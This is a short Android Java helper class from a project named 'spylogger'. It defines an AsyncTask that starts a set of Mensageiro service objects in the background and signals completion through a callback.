package com.gravatasufoca.spylogger.helpers;

import android.content.Context;
import android.os.AsyncTask;

import com.gravatasufoca.spylogger.services.Mensageiro;

/**
 * Created by bruno on 21/04/17.
 */

public class MensageiroAsyncHelper extends AsyncTask<Mensageiro,Integer,Boolean> {

    private Context context;
    private TaskComplete taskComplete;

    public MensageiroAsyncHelper(Context context, TaskComplete taskComplete) {
        this.context = context;
        this.taskComplete = taskComplete;
    }

    @Override
    protected Boolean doInBackground(Mensageiro... mensageiros) {
        if(mensageiros!=null){
            for (Mensageiro mensageiro:mensageiros) {
                mensageiro.start();
            }
            return true;
        }
        return false;
    }

    @Override
    protected void onPostExecute(Boolean aBoolean) {
        if (aBoolean && taskComplete != null) {
            taskComplete.onFinish(null);
        }
    }
}
